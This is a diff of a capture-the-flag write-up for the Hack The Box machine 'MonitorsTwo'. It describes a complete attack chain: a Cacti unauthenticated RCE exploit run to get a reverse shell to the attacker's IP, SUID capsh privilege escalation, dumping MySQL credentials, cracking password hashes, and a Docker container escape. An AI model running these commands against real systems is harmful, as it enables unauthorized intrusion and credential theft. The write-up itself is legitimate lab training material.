@@ -4,25 +4,25 @@
 
 To begin with, I start scanning all the ports on the target to obtain an overall picture of the target. For this I use following command “sudo nmap -sS --min-rate 10000 -p- monitors2.htb”
 
-![Imagen1](https://github.com/0xCOrS/WriteUps/assets/97627828/98bff5d9-6b41-4f5d-bcad-71127d428905)
+![Imagen1](images/Monitors2/Imagen1.png)
 
 Once the open ports are known, It began the service enumeration process. In order to do this, nmap tool was used and, specifically the following command: “sudo nmap -sS -sV -O -oN moni-tors2ServiceVersions p22,80 -Pn monitors2.htb”
 
-![Imagen2](https://github.com/0xCOrS/WriteUps/assets/97627828/d6d7f1c5-138c-4dcd-a371-fa1a6e15198b)
+![Imagen2](images/Monitors2/Imagen2.png)
 
 ### Port Scan Results
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/35cd654f-d65c-450c-88c7-df5e3f4ac701)
+
 
 ### HTTP Enumeration
 
 The first thing done is to manually visit the web. Landing page is a login page where it is found that web server is running Cacti software version 1.2.22
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/4203219c-f57d-4667-818d-506160863446)
+![image](images/Monitors2/Imagen3.png)
 
 With this information, I elaborate a dictionary with the default cacti directories (found on cacti github https://github.com/Cacti/cacti.git ) and run a directory scan using gobuster to find which of those pages I have access to.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/c0372472-f134-4a98-a007-f2140f51c2fc)
+![image](images/Monitors2/Imagen4.png)
 
 Simultaneously software version vulnerabilities are search and a very interesting Un-authenticated RCE vulnerability is found (CVE 2022-46169).
 
@@ -42,11 +42,11 @@ Simultaneously software version vulnerabilities are search and a very interestin
       
   •	Run the exploit using the command “python cactiRCE.py –url http://monitorstwo.htb --ip 10.10.14.9 --port 444”
       
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/6b1ed4cc-d7b9-42f1-914c-5a5753154551)
+![image](images/Monitors2/Imagen5.png)
     
   •	Receiving the shell in port 444.
       
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/c491d862-f13d-4ca6-91da-e214d00bb6f2)
+![image](images/Monitors2/Imagen6.png)
 
 **Proof of Concept Code**: no modifications were made to the original exploit PoC obtained from “https://github.com/devilgothies/CVE-2022-46169/blob/main/CVE-2022-46169.py”.
 
@@ -60,49 +60,49 @@ Once a shell as www-data is obtained, it is clear that there is a docker running
 
       •	We find ourselves in a restricted environment with limited commands, no “ifcon-fig”, no “ping”.
  
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/6e708764-cd72-4a2a-b7d2-7704578602b7)
+![image](images/Monitors2/Imagen7.png)
 
 To escalate privileges, find command will be used to search for SUID binaries in the container.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/54d1ff1a-0d2c-4489-b294-e850cf4e636d)
+![image](images/Monitors2/Imagen8.png)
 
 As shown in the previous picture, capsh is found. This binary is very useful at privilege escalation stage (https://gtfobins.github.io/gtfobins/capsh/) as it is possible to spawn a privilege bash using “./capsh --gid=0 --uid=0 --".
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/a71ada31-fae6-458e-a0e4-b7f0d22c7b5d)
+![image](images/Monitors2/Imagen9.png)
 
 Now that root shell is obtained inside the container, the next step is to escape outside the container to the host.
 
 For this step, it is vital the “/entrypoint.sh” file. 
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/fac5b53b-7c5a-4b9e-b5d8-72fbb4ecd40b)
+![image](images/Monitors2/Imagen10.png)
 
 As it is shown in the highlighted area, there are cleartext credentials for MySQL user “root”. 
 
 Trying to use mysql tool inside the container is very slow so it is decided to dump the database and to inspecting manually on the attacking machine. For this, mysqldump tool is used “mysqldump -h db -u root -p --all-databases > /tmp/dumping.sql”.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/569def36-cf8a-4c9f-8639-a632e3e9dd26)
+![image](images/Monitors2/Imagen11.png)
 
 To transfer the file to the attacking machine, I simply locate the file on the web server root, make it public changing its permissions to 777 and download it with “wget http://monitorstwo.htb/dumping.sql”.
 
 Once on the attacking machine, inspecting the contents, password hashes are found for three different users: guest, admin and marcus.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/7cf7af24-bcbe-4702-b3b6-355d49f1efa6)
+![image](images/Monitors2/Imagen12.png)
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/545cfc56-fc33-4416-88b0-3405c2b838d1)
+METER FOTO HASHES
 
 “Admin” and “Marcus” hashes are “bcrypt $2*$, Blowfish” type of hash.
 
 Next step is to try and crack these hashes. For this, hashcat will be used and specifi-cally “.\hashcat -m 3200 -a 0 hash.txt rockyou.txt”.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/262e004c-424b-4f82-93af-1af2aa1a5815)
+![image](images/Monitors2/Imagen13.png)
 
 As seen in Illustration 13 recovered password for user “marcus” is “funkymonkey”. Using these credentials via ssh on the host lets us escape the docker environment and access as a regular user on the host “monitorstwo”.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/fb13a592-5b98-44f2-9b36-07faf887a484)
+![image](images/Monitors2/Imagen14.png)
 
 Once inside the host, an interesting mail file is found “/var/mail/marcus”.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/470fa94a-8d02-434a-921e-cd82e3b529e1)
+![image](images/Monitors2/Imagen15.png)
 
 Mail contains a message from the Administrator to everybody where it talks about some vulnerabilities that need to be patched in the system. Checking software ver-sions, it is possible to confirm that Docker software version is vulnerable to “CVE-2021-41091”
 
@@ -122,38 +122,39 @@ Taking into account the latter, if a binary is owned by root in the container, i
       sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
       ```
       
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/8b8cdfa7-4583-4ced-86f2-7b2fdc01a9cb)
+![image](images/Monitors2/Imagen16.png)
 
 • Check that from the host with a non-privileged user it is possible to interact with the container file system. A file “/tmp/checking” will be created inside the container and accessed from the host via “/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/tmp/checking”
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/90e3e182-0f14-4664-b10e-6e4f8fd732ea)
+![image](images/Monitors2/Imagen17.png)
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/589e4592-3f70-49cf-816f-175669b5b81d)
+![image](images/Monitors2/Imagen18.png)
 
 • Copy bash binary from the host to the container.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/4c9d340e-070c-450e-a696-f5e19fbb6043)
+![image](images/Monitors2/Imagen19.png)
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/dd9e4f65-c51b-46f8-8f2a-57578383a966)
+![image](images/Monitors2/Imagen20.png)
 
 • Change the owner to root:root and set permissions to 4755 (SUID) to /tmp/bash from inside the container as root.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/c67e88bb-29bf-4833-bae1-98e58fa27a08)
+![image](images/Monitors2/Imagen21.png)
 
 • Check permissions of the file from the host as “marcus”.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/29a5ff88-787c-4a23-b4a2-a004ed3eebcc)
+![image](images/Monitors2/Imagen22.png)
 
 • Elevate privileges executing the binary with “-p” flag from outside the container.
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/3f2ee68f-1623-4ee6-b1c2-174d33e660f4)
+![image](images/Monitors2/Imagen23.png)
 
 ### Post-Expoitation
 
 **System Proof Screenshot**
 
-![image](https://github.com/0xCOrS/WriteUps/assets/97627828/792ac78c-bf1a-4041-ab2c-c7a64e60fe3d)
+![image](images/Monitors2/Imagen24.png)
 
+![image](images/Monitors2/Imagen25.png)
 
 
 
